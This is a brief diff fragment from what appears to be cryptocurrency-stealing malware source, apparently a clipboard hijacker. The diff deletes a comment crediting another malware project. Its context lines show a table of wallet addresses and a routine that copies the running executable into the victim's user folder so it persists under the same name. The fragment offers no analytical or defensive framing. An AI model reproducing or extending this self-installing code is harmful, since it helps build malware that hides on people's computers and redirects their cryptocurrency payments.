@@ -21,7 +21,6 @@ addresses = {
     'XLM': ''
 }
 
-# migration magic (thanks pysilon - mategol)
 get_file_name = os.path.basename(sys.executable)
 if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + get_file_name and not os.path.exists('C:\\Users\\' + getuser() + '\\' + get_file_name):
     shutil.copy2(sys.argv[0], 'C:\\Users\\' + getuser() + '\\' + get_file_name)
